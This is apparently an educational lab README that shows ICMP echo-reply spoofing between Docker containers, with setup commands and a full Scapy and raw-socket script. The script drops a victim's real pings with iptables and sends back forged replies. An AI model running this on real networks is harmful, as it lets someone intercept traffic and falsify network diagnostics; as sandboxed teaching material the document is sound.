# ICMP Ping Spoof Attack Demo

This repository demonstrates a simple ICMP Echo Request spoofing attack using Docker containers and a custom Python script (`spoof2.py`).  The attacker is positioned as a gateway between a victim and a router, intercepting and forging ICMP replies.

---

## Table of Contents

1. [Network Topology](#network-topology)
2. [Prerequisites](#prerequisites)
3. [Setup](#setup)

   * [1. Create Docker Networks](#1-create-docker-networks)
   * [2. Launch Containers](#2-launch-containers)
   * [3. Install Dependencies](#3-install-dependencies)
   * [4. Configure Routing](#4-configure-routing)
   * [5. Enable IP Forwarding](#5-enable-ip-forwarding)
   * [6. Copy Attack Script](#6-copy-attack-script)
4. [Attack Script (`spoof2.py`)](#attack-script-spoof2py)
5. [Demonstration](#demonstration)
6. [Cleanup](#cleanup)

---

## Network Topology

```
                              ICMP Spoofing Attack Topology
                              ══════════════════════════════

    Network: net_vict_att                    Network: net_att_rout
    Subnet: 20.10.0.0/24                    Subnet: 20.20.0.0/24
    ┌─────────────────────┐                 ┌─────────────────────┐
    │                     │                 │                     │
    │                     │                 │                     │
    │  ┌─────────────┐    │                 │    ┌─────────────┐  │
    │  │   VICTIM    │    │                 │    │   ROUTER    │  │
    │  │  (victim2)  │    │                 │    │  (router2)  │  │
    │  │             │    │                 │    │             │  │
    │  │ 20.10.0.2   │    │                 │    │ 20.20.0.2   │  │
    │  └─────┬───────┘    │                 │    └─────┬───────┘  │
    │        │            │                 │          │          │
    │        │ eth0       │                 │          │ eth0     │
    │        │            │                 │          │          │
    │   ─────┼────────    │                 │     ─────┼────────  │
    │        │            │                 │          │          │
    │        │            │                 │          │          │
    └────────┼────────────┘                 └──────────┼──────────┘
             │                                         │
             │                                         │
          ┌──▼──┐                                   ┌──▼──┐
          │eth0 │                                   │eth1 │
          └──┬──┘                                   └──┬──┘
             │                                         │
       ┌─────▼──────────────────────────────────────────▼─────┐
       │              ATTACKER (attacker2)                    │
       │                                                      │
       │  ┌─────────────────┐    ┌─────────────────────────┐  │
       │  │ Interface eth0  │    │    Interface eth1       │  │
       │  │   20.10.0.3     │    │      20.20.0.3         │  │
       │  │                 │    │                         │  │
       │  │ • IP Forwarding │    │ • Packet Interception  │  │
       │  │ • ICMP Spoofing │    │ • Traffic Forwarding   │  │
       │  └─────────────────┘    └─────────────────────────┘  │
       └──────────────────────────────────────────────────────┘

    ═══════════════════════════════════════════════════════════════════
    
    📡 Attack Flow:
    ──────────────
    1. Victim sends ICMP Echo Request → Attacker (20.10.0.3)
    2. Attacker intercepts and drops real packets to Router
    3. Attacker crafts spoofed ICMP Echo Reply
    4. Victim receives fake reply appearing to come from Router
    
    🔧 Key Configuration:
    ────────────────────
    • Victim default gateway: 20.10.0.3 (Attacker)
    • Router default gateway: 20.20.0.3 (Attacker) 
    • Attacker has IP forwarding enabled
    • iptables rules drop legitimate ICMP to ensure spoofing works
```

* **victim2**: 20.10.0.2/24 on `net_vict_att`
* **attacker2**: dual-homed

  * `eth0` on `net_vict_att` with IP 20.10.0.3
  * `eth1` on `net_att_rout` with IP 20.20.0.3
* **router2**: 20.20.0.2/24 on `net_att_rout`

All traffic from `victim2` to `router2` is forced through `attacker2` for interception.

---

## Prerequisites

* Docker
* Python 3
* `pip3` (for Scapy)

---

## Setup

### 1. Create Docker Networks

```bash
sudo docker network create --driver=bridge --subnet=20.10.0.0/24 net_vict_att
sudo docker network create --driver=bridge --subnet=20.20.0.0/24 net_att_rout
```

### 2. Launch Containers

```bash
# Victim
sudo docker run -d --name victim2 \
  --cap-add NET_ADMIN \
  --network net_vict_att --ip 20.10.0.2 \
  ubuntu:22.04 sleep infinity

# Router
sudo docker run -d --name router2 \
  --cap-add NET_ADMIN \
  --network net_att_rout --ip 20.20.0.2 \
  ubuntu:22.04 sleep infinity

# Attacker (dual-homed)
sudo docker run -d --name attacker2 \
  --cap-add NET_ADMIN --cap-add NET_RAW \
  --network net_vict_att --ip 20.10.0.3 \
  ubuntu:22.04 sleep infinity
sudo docker network connect --ip 20.20.0.3 net_att_rout attacker2
```

### 3. Install Dependencies

```bash
# Victim needs ping + ip
sudo docker exec victim2 bash -lc "apt update && apt install -y iproute2 iputils-ping"

# Router needs ping, ip, tcpdump
sudo docker exec router2 bash -lc "apt update && apt install -y iproute2 iputils-ping tcpdump"

# Attacker needs forwarding, iptables, Python, Scapy, tcpdump
sudo docker exec attacker2 bash -lc "apt update && apt install -y iproute2 iptables python3-pip libpcap-dev tcpdump && pip3 install scapy"
```

### 4. Configure Routing

```bash
# Victim → Attacker gateway
sudo docker exec victim2 bash -lc "ip route del default && ip route add default via 20.10.0.3 dev eth0"

# Router → Attacker gateway
sudo docker exec router2 bash -lc "ip route del default && ip route add default via 20.20.0.3 dev eth0"
```

### 5. Enable IP Forwarding

```bash
sudo docker exec attacker2 bash -lc "sysctl -w net.ipv4.ip_forward=1"
```

### 6. Copy Attack Script

```bash
# Copy spoof2.py to attacker2
sudo docker cp spoof2.py attacker2:/root/spoof2.py
```

---

## Attack Script (`spoof2.py`)

Place the following in `spoof2.py` and copy to `/root/` of attacker2.  Run with `python3 /root/spoof2.py`.

```python
#!/usr/bin/env python3
import atexit, subprocess, socket, struct
from scapy.all import sniff, IP, ICMP, conf

# Configuration
ROUTER_IP = "20.20.0.2"
VICTIM_IP = "20.10.0.2"
IFACE     = "eth0"

# Insert iptables DROP rule on startup
DROP_RULE = [
    "iptables", "-I", "FORWARD",
    "-s", VICTIM_IP,
    "-d", ROUTER_IP,
    "-p", "icmp", "--icmp-type", "echo-request",
    "-j", "DROP"
]

def cleanup():
    subprocess.run(["iptables", "-D", "FORWARD"] + DROP_RULE[1:], check=False)
    print("Removed DROP rule.")
atexit.register(cleanup)

def setup():
    subprocess.run(DROP_RULE, check=True)
    print("Inserted DROP rule.")

# Checksum helper
def checksum(data: bytes) -> int:
    if len(data) % 2: data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s>>16) + (s & 0xffff); s += s>>16
    return ~s & 0xffff

# Packet handler
def handle_request(pkt):
    if IP in pkt and ICMP in pkt and pkt[IP].dst == ROUTER_IP and pkt[ICMP].type == 8:
        ic = pkt[ICMP]
        print(f"Sniffed Echo Request id={ic.id}, seq={ic.seq}")
        # Build IP header
        ip_hdr = struct.pack("!BBHHHBBH4s4s",
            (4<<4)|5, 0,
            20+8+len(ic.payload), 0,0,64,
            socket.IPPROTO_ICMP, 0,
            socket.inet_aton(ROUTER_IP),
            socket.inet_aton(VICTIM_IP)
        )
        ip_hdr = ip_hdr[:10] + struct.pack("!H", checksum(ip_hdr)) + ip_hdr[12:]
        # Build ICMP header
        payload = bytes(ic.payload)
        icmp_pfx = struct.pack("!BBHHH",0,0,0,ic.id,ic.seq)
        icmp_ck = checksum(icmp_pfx+payload)
        icmp_hdr = struct.pack("!BBHHH",0,0,icmp_ck,ic.id,ic.seq)
        packet = ip_hdr + icmp_hdr + payload
        # Send forged reply
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL,1)
        s.sendto(packet, (VICTIM_IP,0))
        print(f"Sent spoofed Echo Reply to {VICTIM_IP}")

if __name__ == "__main__":
    conf.use_pcap = True
    setup()
    print(f"Listening for ICMP to {ROUTER_IP} on {IFACE}…")
    sniff(iface=IFACE, filter=f"icmp and dst {ROUTER_IP}", prn=handle_request)
```

---

## Demonstration

1. **Baseline (no attack)**

   ```bash
   sudo docker exec router2 tcpdump -n icmp
   sudo docker exec victim2 ping -c4 20.20.0.2
   ```

   * Router2 sees Echo-Requests and replies normally.

2. **Start attack**

   ```bash
   sudo docker exec attacker2 python3 /root/spoof2.py
   ```

3. **Spoofed ping**

   ```bash
   sudo docker exec victim2 ping -c4 20.20.0.2
   ```

   * Victim sees replies (`ttl=64` by default).
   * Router2’s tcpdump shows **no** Echo-Requests.

4. **Proof**

   * Modify TTL in `spoof2.py` to `200` and rerun for TTL fingerprint:

     ```diff
       # in ip_hdr pack: replace 64 with 200
     ```
   * Victim’s ping reply lines now show `ttl=200`, proving they’re forged.

---

## Cleanup

```bash
sudo docker rm -f victim2 attacker2 router2
sudo docker network rm net_vict_att net_att_rout
```

---

*End of README.md*
